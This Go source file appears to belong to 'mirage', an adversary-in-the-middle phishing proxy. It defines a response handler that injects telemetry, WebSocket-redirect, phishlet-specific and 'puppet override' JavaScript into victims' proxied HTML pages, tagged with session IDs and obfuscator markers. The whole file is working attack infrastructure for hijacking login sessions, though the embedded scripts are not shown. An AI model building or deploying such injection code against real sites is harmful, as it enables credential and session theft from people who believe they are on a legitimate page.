package response

import (
	"bytes"
	_ "embed"
	"fmt"
	"net/http"
	"strings"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/obfuscator"
	"github.com/travisbale/mirage/internal/proxy"
)

//go:embed dist/telemetry.min.js
var telemetryScript string

//go:embed dist/redirect.min.js
var redirectScript string

// JSInjector appends the telemetry collector and WebSocket redirect scripts
// into HTML responses before </body>.
type JSInjector struct{}

func (h *JSInjector) Name() string { return "JSInjector" }

func (h *JSInjector) Handle(ctx *aitm.ProxyContext, resp *http.Response) error {
	if ctx.Session == nil || !isHTMLResponse(resp) {
		return nil
	}
	bodyBytes, err := readBody(resp)
	if err != nil {
		return err
	}

	quotedSID := fmt.Sprintf("%q", ctx.Session.ID)
	var scriptContent strings.Builder
	scriptContent.WriteString(injectSID(telemetryScript, quotedSID))
	scriptContent.WriteString(injectSID(redirectScript, quotedSID))

	if ctx.Phishlet != nil && resp.Request != nil {
		for _, jsInject := range ctx.Phishlet.JSInjects {
			if jsInject.TriggerDomain == resp.Request.Host &&
				jsInject.TriggerPath.MatchString(resp.Request.URL.Path) {
				scriptContent.WriteString(jsInject.Script)
			}
		}
	}

	// Inject puppet override before </head> so property overrides are active
	// before any page JavaScript runs.
	if ctx.PuppetOverride != "" {
		bodyBytes = bytes.Replace(bodyBytes, []byte("</head>"),
			[]byte(markedScript(ctx.PuppetOverride)+"\n</head>"), 1)
	}

	scriptBlock := []byte(markedScript(scriptContent.String()))
	if i := bytes.Index(bodyBytes, []byte("</body>")); i >= 0 {
		bodyBytes = append(bodyBytes[:i], append(append(scriptBlock, '\n'), bodyBytes[i:]...)...)
	} else {
		bodyBytes = append(bodyBytes, '\n')
		bodyBytes = append(bodyBytes, scriptBlock...)
	}
	replaceBody(resp, bodyBytes)
	return nil
}

func markedScript(content string) string {
	return fmt.Sprintf("<script>%s\n%s\n%s</script>", obfuscator.MarkerStart, content, obfuscator.MarkerEnd)
}

func injectSID(script, quotedSID string) string {
	return strings.ReplaceAll(script, `"__MIRAGE_SID__"`, quotedSID)
}

func isHTMLResponse(resp *http.Response) bool {
	return strings.HasPrefix(resp.Header.Get("Content-Type"), "text/html")
}

var _ proxy.ResponseHandler = (*JSInjector)(nil)
